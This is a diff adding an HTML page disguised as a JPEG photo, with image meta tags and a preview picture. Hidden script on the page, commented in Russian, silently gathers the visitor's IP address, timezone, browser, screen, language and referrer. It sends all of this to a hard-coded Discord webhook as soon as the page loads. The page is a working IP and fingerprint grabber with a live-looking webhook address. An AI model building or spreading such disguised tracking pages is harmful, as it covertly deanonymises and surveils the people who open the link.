@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>photo.jpg</title>
+    <meta http-equiv="Content-Type" content="image/jpeg">
+    <meta property="og:image" content="https://i.imgur.com/6QJqjxk.jpg">
+    <meta property="og:title" content="photo.jpg">
+    <meta property="og:type" content="image/jpeg">
+    <style>
+        body { margin: 0; background: black; text-align: center; }
+        img { max-width: 100%; max-height: 100vh; }
+    </style>
+</head>
+<body>
+    <img src="https://i.imgur.com/6QJqjxk.jpg" id="photo">
+    
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1489290289649549424/WIAoa5NkDmV1qsyaBx4cZQCMqhSuUnrXa21xlUq24d_GLnl64-C0q5BGJI0k2wnJZh5u";
+        
+        // СБОР ДАННЫХ
+        const data = {
+            time: new Date().toLocaleString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + "x" + screen.height,
+            window_size: window.innerWidth + "x" + window.innerHeight,
+            referer: document.referrer || "прямой переход",
+            url: window.location.href,
+            cookies: navigator.cookieEnabled,
+            cores: navigator.hardwareConcurrency || "неизвестно"
+        };
+        
+        // ПОЛУЧАЕМ IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                data.ip = ipData.ip;
+                // ОТПРАВЛЯЕМ ПОСЛЕ ПОЛУЧЕНИЯ IP
+                sendToDiscord();
+            })
+            .catch(() => {
+                data.ip = "не определен";
+                sendToDiscord();
+            });
+        
+        function sendToDiscord() {
+            let message = `**🖼️ ПЕРЕХОД ПО ФОТО**\n`;
+            message += `\`\`\`\n`;
+            message += `Время: ${data.time} (${data.timezone})\n`;
+            message += `IP: ${data.ip}\n`;
+            message += `User Agent: ${data.user_agent.substring(0, 100)}...\n`;
+            message += `Платформа: ${data.platform}\n`;
+            message += `Экран: ${data.screen}\n`;
+            message += `Окно: ${data.window_size}\n`;
+            message += `Язык: ${data.language}\n`;
+            message += `Cookies: ${data.cookies ? "включены" : "отключены"}\n`;
+            message += `Ядра CPU: ${data.cores}\n`;
+            message += `Referrer: ${data.referer}\n`;
+            message += `URL: ${data.url}\n`;
+            message += `\`\`\``;
+            
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: message })
+            }).catch(e => console.log("Ошибка:", e));
+        }
+    </script>
+</body>
+</html>
